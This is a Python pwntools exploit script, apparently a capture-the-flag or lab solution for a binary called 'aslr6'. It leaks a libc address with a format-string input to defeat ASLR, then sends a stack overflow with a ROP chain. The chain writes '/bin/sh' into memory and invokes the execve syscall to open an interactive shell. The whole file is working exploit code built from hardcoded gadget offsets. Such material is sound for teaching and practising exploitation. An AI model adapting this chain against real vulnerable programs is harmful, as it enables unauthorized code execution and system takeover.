#!/bin/python

from pwn import *

context.clear(arch = 'amd64')
context.terminal = ['alacritty', '-e', 'sh', '-c']

e = ELF('/usr/lib/libc.so.6')

return_offset = e.symbols['__libc_start_main'] + 213
rw_offset = 1835008


POP_RAX_OFFSET = 0x3fe60
POP_RDI_OFFSET = 0x27f75
POP_RSI_OFFSET = 0x2978f
POP_RDX_R12_OFFSET = 0xf9c37

MOV_QWORD_PTR_RSI_RDI_OFFSET = 0x119881

SYSCALL_OFFSET = 0x5962a



io = gdb.debug('./aslr6', gdbscript = '''
    b main
    b vuln 
    c
        ''')
#io = process('./aslr6');

io.recvuntil(b"input 1:\n")
io.sendline(b"%9$llx")

return_addr = int(io.recvline().decode('ASCII'), 16)
base_addr = return_addr - return_offset

log.info("Return address: " + hex(return_addr))
log.info("Base address " + hex(base_addr))

io.recvuntil(b"input 2:\n")
io.sendline(
        b'A' * 16 +
        b'B' * 8 +
        p64(base_addr + POP_RSI_OFFSET) +
        p64(base_addr + rw_offset) +
        p64(base_addr + POP_RDI_OFFSET) +
        b'/bin/sh\x00' +
        p64(base_addr + MOV_QWORD_PTR_RSI_RDI_OFFSET) +
        p64(base_addr + POP_RDI_OFFSET) +
        p64(base_addr + rw_offset) +
        p64(base_addr + POP_RSI_OFFSET) +
        p64(0x00) +
        p64(base_addr + POP_RDX_R12_OFFSET) +
        p64(0x00) +
        p64(0xdeadbeefcafebabe) +
        p64(base_addr + POP_RAX_OFFSET) +
        p64(59) +
        p64(base_addr + SYSCALL_OFFSET)
    )

io.interactive()
